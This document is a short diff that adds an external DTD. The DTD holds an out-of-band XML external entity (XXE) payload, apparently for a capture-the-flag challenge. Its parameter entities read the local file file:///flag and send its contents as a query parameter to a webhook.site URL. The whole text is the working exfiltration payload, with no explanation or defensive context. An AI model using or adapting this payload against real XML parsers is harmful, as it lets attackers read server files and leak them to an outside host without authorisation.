@@ -1,0 +1,4 @@
+<!ENTITY % file PUBLIC "x" "file:///flag">
+<!ENTITY % eval "<!ENTITY &#x25; exfil PUBLIC 'x' 'https://webhook.site/08e97a0c-ccb9-4b0f-9077-a4cd5343d00b/?d=%file;'>">
+%eval;
+%exfil;
